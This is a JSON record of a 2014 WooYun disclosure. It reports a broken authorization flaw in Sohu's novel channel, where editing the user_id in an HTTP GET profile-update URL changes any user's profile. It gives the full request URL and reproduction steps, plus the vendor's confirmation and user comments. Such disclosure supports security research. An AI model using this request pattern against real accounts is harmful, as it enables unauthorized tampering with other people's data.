{"id": 53476, "wybug_id": "wooyun-2014-067561", "wybug_title": "搜狐原创小说频道平行权限导致他人资料随便改", "wybug_corp": "搜狐", "wybug_author": "爱上电饭锅", "wybug_date": "2014-07-08 11:46", "wybug_open_date": "2014-08-22 11:48", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口未加权限认证", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向公众公开  简要描述： 资料修改没做权限check导致他人资料随便改。 详细说明：  原创小说频道，个人资料编辑功能存在漏洞，导致随意修改URL后可更改任意用户资料。此case中搜狐用户ID为n位正数，可以任意遍历。而且修改资料的URL居然是HTTP GET，丝毫不用专业工具，IE搞定。   漏洞证明：  1. 注册两个搜狐通行证。2. 到原创小说频道资料编辑页面（vip.book.sohu.com/user/index.php）随便编辑个人信息，保存，抓包。3. 发现2抓的包里，提交个人信息用的居然是TMD的HTTP GET。URL如下：http://vip.book.sohu.com/user/user_edit.php?user_id={userid}&nickname={nickname}&nickname_s=true&passport_s=true&sex=1&sex_s=true&year=1900&month=00&day=00&birthday_s=true&zipcode=&zipcode_s=true&province=%CA%A1/%D6%B1%CF%BD%CA%D0&city=&country=&zone_s=true&qq=&qq_s=true&msn=&msn_s=true&mobile=&mobile_s=true&telephone=&telephone_s=true&microblog=&microblog_s=true&mail=&mail_s=true&loveof=&loveof_s=true&lovebook=&lovebook_s=true&vita=&vita_s=true&Submit=%D0%DE++%B8%C4&d=Sun%20Jul%2006%202014%2000:00:38%20GMT+1200%20(New%20Zealand%20Standard%20Time)&pspt=undefined4. OK了，记下两个用户的userid。全部登出。访问3的URL（userid改为新建的小号）。返回0。5. 登录任意一个搜狐账户，再次访问3的URL，返回1。6. 登录小号，资料已经改了。   修复方案：  不会php   版权声明：转载请注明来源 爱上电饭锅@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-07-08 14:40 厂商回复： 感谢对搜狐安全关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-08 12:08 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  first blood,但貌似走了小厂商    \n     2014-07-08 13:01 |    \t\t爱上电饭锅 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:5        | Web开发，专注XSS，顺便挖些小洞。)\t\t \n  @小川 如果携程算是大厂的话，first blood其实是携程，只不过没显示。    \n     2014-07-08 13:08 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @爱上电饭锅 可以看看是在审核状态，还是忽略了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}